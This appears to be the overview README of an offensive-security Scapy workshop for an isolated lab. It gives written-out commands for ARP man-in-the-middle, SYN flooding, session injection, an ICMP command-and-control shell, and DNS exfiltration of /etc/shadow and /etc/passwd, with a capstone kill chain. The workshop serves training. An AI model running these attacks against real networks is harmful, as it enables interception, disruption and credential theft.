# Workshop Complete — 33 Python Scripts, Vagrant-Provisioned Lab

## Structure

```
dc34_workshop/
├── README.md                    ← Workshop overview, agenda, quick start
├── Vagrantfile                  ← Builds + provisions both lab VMs (vagrant up)
├── requirements.txt             ← streamlit, plotly, networkx, pandas (Scapy installed from source)
├── setup/
│   ├── README.md                ← Vagrant lab setup, network diagram, troubleshooting
│   └── verify_env.py            ← Automated pre-flight check (run first)
├── module1/ Fundamentals        ← Packet construction, send/recv, sniff, PCAP I/O (+ README)
├── module2/ Recon & Scanning    ← SYN scanner, host discovery, OS fingerprinter
├── module3/ ARP & ICMP          ← Full ARP MitM w/ cache restore, ICMP redirect
├── module4/ TCP/IP Stack Abuse  ← Session injector, SYN flood, RST killer, IP options
├── module5/ Protocol Fuzzing    ← DNS fuzzer, custom protocol fuzzer + VULNERABLE server
├── module6/ Covert Channels     ← ICMP C2 (both sides), DNS exfil (both sides), TCP headers
├── capstone/ "Silent Pivot"     ← Full scenario: recon→exploit→C2→exfil, scoring rubric
├── dashboard/                   ← Streamlit visual dashboards (see below)
│   ├── recon_dashboard.py       ← Live recon UI: network map, port heatmap, OS fingerprint
│   ├── capstone_scoreboard.py   ← Projected capstone leaderboard with per-team radar charts
│   └── README.md
├── module7/ AI Lab (optional)   ← Claude API + Scapy: live AI packet narration
│   ├── packet_narrator.py       ← PacketNarrator class + CLI demo
│   ├── ai_lab.py                ← Streamlit AI Lab UI
│   └── README.md
└── redteam_toolkit/             ← Importable Python package + unified CLI
```

---

## 4-Hour Timeline

| Block | Module | Key Takeaway |
|-------|--------|-------------|
| 0:00–0:15 | Setup | Lab verified, Scapy REPL tour |
| 0:15–0:50 | Module 1 | Packet anatomy, `sr1()`, `sniff()`, PCAP |
| 0:50–1:25 | Module 2 | SYN scan, OS fingerprint, IDS evasion |
| 1:25–1:55 | Module 3 | ARP MitM, traffic intercept, cache restore |
| 1:55–2:05 | **Break** | — |
| 2:05–2:40 | Module 4 | Session hijack, SYN flood, fragmentation |
| 2:40–3:10 | Module 5 | Fuzz the vulnerable server, find the crash |
| 3:10–3:40 | Module 6 | ICMP C2, DNS exfil `/etc/passwd` |
| 3:40–4:00 | Capstone | Full kill chain, scoreboard |

---

## Toolkit Quick Start

```bash
# Run these inside the attacker VM (vagrant ssh attacker). Scapy and all
# dependencies are already installed by the Vagrant provisioner; the repo is at /vagrant.

# 0. Verify your lab environment (run this first)
sudo python3 /vagrant/setup/verify_env.py

# 2. Recon — discover live hosts and scan ports
sudo python3 redteam_toolkit/cli.py recon --target 192.168.56.0/24
sudo python3 redteam_toolkit/cli.py scan  --target 192.168.56.2 --ports 1-1024

# 3. ARP MitM — intercept traffic between victim and gateway
sudo python3 redteam_toolkit/cli.py mitm --victim 192.168.56.2 --gateway 192.168.56.254

# 4. Fuzz — find crashes in the custom protocol service
sudo python3 redteam_toolkit/cli.py fuzz --target 192.168.56.2 --port 9000

# 5. ICMP C2 — interactive shell over ICMP (agent must run on target)
sudo python3 redteam_toolkit/cli.py c2 --target 192.168.56.2

# 6. DNS Exfiltration — exfiltrate a file over DNS queries
sudo python3 redteam_toolkit/cli.py exfil --file /etc/shadow --collector 192.168.56.1

# 7. SYN Flood — exhaust TCP backlog on target port
sudo python3 redteam_toolkit/cli.py flood --target 192.168.56.2 --port 80 --duration 30

# 8. RST Injection — kill active TCP sessions
sudo python3 redteam_toolkit/cli.py rst --target 192.168.56.2 --port 23
```

---

## Streamlit Dashboards

### Dependencies
Already installed in the attacker VM by the Vagrant provisioner (streamlit, plotly, pandas, etc.).
The dashboards run inside the VM; open them from your **host** browser at `http://localhost:8501`
(port 8501 is forwarded). For a manual, non-Vagrant setup see `setup/README.md`.

### Recon Dashboard — live visual scan UI (Module 2)

Wraps host discovery + SYN scan + OS fingerprinting in a browser UI.
Shows a live-updating network map, port heatmap, and OS guess table.

```bash
# Requires root (Scapy raw sockets)
sudo streamlit run dashboard/recon_dashboard.py
# Open: http://localhost:8501
```

Use this during **Module 2** as an alternative to terminal output.
The network graph is especially compelling for a live demo — hosts pop
onto the map in real time as Scapy probes the segment.

### Capstone Scoreboard — projected leaderboard (Capstone)

Instructor marks objectives complete per team via the sidebar.
All attendees see the live leaderboard, bar chart, and per-team radar charts.

```bash
# No root needed
streamlit run dashboard/capstone_scoreboard.py

# To share with all lab VMs (everyone sees it at http://192.168.56.1:8501)
streamlit run dashboard/capstone_scoreboard.py --server.address 0.0.0.0
```

Project this on a shared screen for the last 20 minutes of the workshop.
Balloons fire automatically when a team completes all objectives.

---

## Module-by-Module Reference

### Module 1 — Scapy Fundamentals

```bash
# Run all demo sections
sudo python3 module1/fundamentals.py --section all

# Run a specific section
sudo python3 module1/fundamentals.py --section send_receive

# Exercise 1-B: PCAP dissector
sudo python3 module1/pcap_dissector.py samples/http_session.pcap filtered.pcap
```

Key concepts: `/` stacking operator, `.show2()`, `sr1()`, `sniff()`, `AsyncSniffer`,
`wrpcap()`, `rdpcap()`, `fuzz()`.

---

### Module 2 — Active Recon and Scanning

```bash
# Host discovery (ARP sweep — most reliable on local /24)
sudo python3 module2/host_discovery.py 192.168.56.0/24

# Use all methods (ARP + ICMP + TCP + UDP)
sudo python3 module2/host_discovery.py 192.168.56.0/24 --method all

# SYN port scan
sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 1-1024
sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 22,80,443,8080,9000

# OS fingerprinting
sudo python3 module2/os_fingerprint.py 192.168.56.2 --port 80
```

Evasion tips: use `--timeout 0.5` for slower scans, add TTL jitter, use IP fragmentation
(`module4/ip_options.py --demo frag`) to break IDS signatures.

---

### Module 3 — ARP and ICMP Manipulation

```bash
# Passive ARP observer (no packets sent — pure reconnaissance)
sudo python3 module3/arp_scanner.py --iface eth0 --timeout 60

# ARP MitM (requires IP forwarding)
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo python3 module3/arp_mitm.py --victim 192.168.56.2 --gateway 192.168.56.254 --iface eth0

# ICMP Redirect injection
sudo python3 module3/icmp_redirect.py \
    --victim 192.168.56.2 --gateway 192.168.56.254 \
    --redirect-host 8.8.8.8 --attacker 192.168.56.1
```

Cleanup: `arp_mitm.py` automatically restores ARP caches on Ctrl-C.
Always verify IP forwarding is enabled before starting MitM or victim loses connectivity.

---

### Module 4 — TCP/IP Stack Abuse

```bash
# TCP session injector (requires ARP MitM positioning)
sudo python3 module4/tcp_injector.py \
    --victim 192.168.56.2 --gateway 192.168.56.254 \
    --port 23 --payload "echo HACKED >> /tmp/pwned\n"

# SYN flood (monitor target with: watch -n1 'ss -s')
sudo python3 module4/syn_flood.py --target 192.168.56.2 --port 80 --duration 30

# RST injection — kill sessions passively
sudo python3 module4/rst_injector.py --target 192.168.56.2 --port 23 --continuous

# IP options demo (LSRR, Record Route, fragmentation)
sudo python3 module4/ip_options.py --demo all --target 192.168.56.2
sudo python3 module4/ip_options.py --demo frag --target 192.168.56.2
```

---

### Module 5 — Protocol Fuzzing

```bash
# Start the vulnerable target server (run on target VM)
python3 module5/target_server.py --port 9000

# DNS fuzzer (target must run dnsmasq or bind9)
sudo python3 module5/dns_fuzzer.py --target 192.168.56.2 --iters 500

# Custom protocol fuzzer — finds the buffer overflow in target_server.py
sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --port 9000 --iters 1000

# Stateful fuzzer skeleton (exercise 5-X)
sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --stateful

# Inspect the protocol definition
python3 module5/custom_proto.py
```

The vulnerable server (`target_server.py`) has four intentional bugs.
The main one: opcode `0xFF` with payload > 64 bytes triggers a buffer overflow crash.

---

### Module 6 — Covert Channels

```bash
# ── ICMP C2 ──────────────────────────────────────────────────────────────────
# Step 1: Start agent on TARGET VM
sudo python3 module6/icmp_agent.py --iface eth0

# Step 2: Connect from ATTACKER
sudo python3 module6/icmp_tunnel.py --target 192.168.56.2
# > whoami
# > id
# > cat /etc/passwd

# Single command (non-interactive)
sudo python3 module6/icmp_tunnel.py --target 192.168.56.2 --cmd "uname -a"

# ── DNS Exfiltration ──────────────────────────────────────────────────────────
# Step 1: Start collector on ATTACKER
sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/received.txt

# Step 2: Send file from TARGET (or attacker for demo)
sudo python3 module6/dns_exfil.py --file /etc/passwd --collector 192.168.56.1

# ── TCP Header Covert Channels (demo) ────────────────────────────────────────
sudo python3 module6/tcp_covert.py --demo ipid   --send "HELLO DC34" --target 192.168.56.2
sudo python3 module6/tcp_covert.py --demo tos    --send "HELLO DC34" --target 192.168.56.2
sudo python3 module6/tcp_covert.py --demo urgent --send "HELLO DC34" --target 192.168.56.2
sudo python3 module6/tcp_covert.py --demo timing --send "HI"         --target 192.168.56.2

# Receive IP ID channel
sudo python3 module6/tcp_covert.py --recv ipid --iface eth0
```

---

## Capstone — "Silent Pivot" Scenario

### Objectives (100 pts + 10 bonus)

| # | Objective | Points |
|---|-----------|--------|
| 1 | Discover all live hosts on /24 without triggering > 5 Snort alerts | 20 |
| 2 | Identify the service running on port 9000 | 15 |
| 3 | Crash the service using your fuzzer | 25 |
| 4 | Execute a command on target via ICMP C2 | 20 |
| 5 | Exfiltrate `/etc/shadow` via DNS | 20 |
| B | Clean up: restore ARP, kill agents, remove dropped files | +10 |

### Lab Prerequisites for Capstone

On target VM, start both services:
```bash
python3 module5/target_server.py --port 9000 &
sudo python3 module6/icmp_agent.py --iface eth0 &
```

### Full Attack Chain (walkthrough)

```bash
# 1. Stealth host discovery
sudo python3 module2/host_discovery.py 192.168.56.0/24 --method arp

# 2. Identify service on port 9000
sudo python3 module2/syn_scanner.py 192.168.56.2 --ports 9000
python3 module5/custom_proto.py   # examine the protocol

# 3. Fuzz and crash the service
sudo python3 module5/custom_fuzzer.py --target 192.168.56.2 --port 9000

# 4. ICMP C2 shell
sudo python3 module6/icmp_tunnel.py --target 192.168.56.2

# 5. DNS exfiltration
sudo python3 module6/dns_collector.py --iface eth0 --output /tmp/shadow &
sudo python3 module6/dns_exfil.py --file /etc/shadow --collector 192.168.56.1

# 6. Cleanup
sudo arp -d 192.168.56.254
sudo arp -d 192.168.56.2
# (via C2): pkill -f icmp_agent; rm -f /tmp/pwned
```

---

## Using the Toolkit as a Python Library

```python
from redteam_toolkit.recon  import sweep, syn_scan
from redteam_toolkit.mitm   import ArpMitm
from redteam_toolkit.fuzzer import fuzz_service
from redteam_toolkit.covert import IcmpC2, DnsExfil

# Host discovery
live = sweep("192.168.56.0/24", method="arp")

# Port scan
ports = syn_scan("192.168.56.2", "1-1024")
open_ports = [p for p, s in ports.items() if s == "open"]

# ARP MitM as context manager (auto-restores on exit)
def my_intercept(pkt):
    if pkt.haslayer("Raw"):
        print(pkt["Raw"].load[:80])

with ArpMitm("192.168.56.2", "192.168.56.254", callback=my_intercept):
    import time; time.sleep(30)

# Fuzz the service
crashes = fuzz_service("192.168.56.2", port=9000, iters=500)

# ICMP C2
c2 = IcmpC2("192.168.56.2")
output = c2.run("whoami")
print(output)

# DNS exfil
exfil = DnsExfil(collector_ip="192.168.56.1", delay=0.3)
exfil.send("/etc/passwd")
```

---

## Legal and Ethical Scope

All techniques in this workshop are authorized for use **only** in:
- The provided isolated lab VMs
- Environments you own or have explicit written authorization to test
- CTF competitions and authorized red team engagements

Unauthorized use against real networks violates the CFAA (18 U.S.C. § 1030)
and equivalent laws worldwide.

---

### Module 7 — AI Lab: PacketSage (Optional)

Integrates the Claude API with Scapy for live, streaming AI narration of network events.
Requires `ANTHROPIC_API_KEY`.

```bash
# CLI demo — watch live traffic and get per-packet narration
sudo python3 module7/packet_narrator.py --iface eth0 --mode recon
sudo python3 module7/packet_narrator.py --iface eth0 --mode arp_mitm

# Ask PacketSage a direct question
python3 module7/packet_narrator.py --ask "What is TTL fingerprinting?"

# Streamlit AI Lab — three-panel browser UI with live packet feed and chat
sudo streamlit run module7/ai_lab.py
# Open: http://localhost:8501
```

Available attack contexts (set with `--mode`): `recon`, `arp_mitm`, `tcp_abuse`,
`fuzzing`, `covert_c2`, `general`.

Use `PacketNarrator` as a library inside any module:

```python
from module7.packet_narrator import PacketNarrator

narrator = PacketNarrator(attack_context="recon")

# Narrate a single Scapy packet
for chunk in narrator.narrate_packet(pkt):
    print(chunk, end="", flush=True)

# Narrate a named attack step
for chunk in narrator.narrate_attack_step(
    "ARP Cache Poisoned",
    "Sent 2 gratuitous ARP replies to victim and gateway",
    packets=[pkt1, pkt2],
):
    print(chunk, end="", flush=True)

# Ask a free-form question about what you're seeing
for chunk in narrator.ask("Why is the TTL on these replies 64 and not 128?"):
    print(chunk, end="", flush=True)
```

---

## Resources

- [Scapy documentation](https://scapy.readthedocs.io/)
- RFC 793 (TCP), RFC 826 (ARP), RFC 792 (ICMP), RFC 1035 (DNS)
- *Black Hat Python* — Justin Seitz (No Starch Press)
- *The Art of Exploitation* — Jon Erickson (No Starch Press)
- Mandiant M-Trends annual threat report (real-world APT TTPs)
- p0f passive OS fingerprinter source code
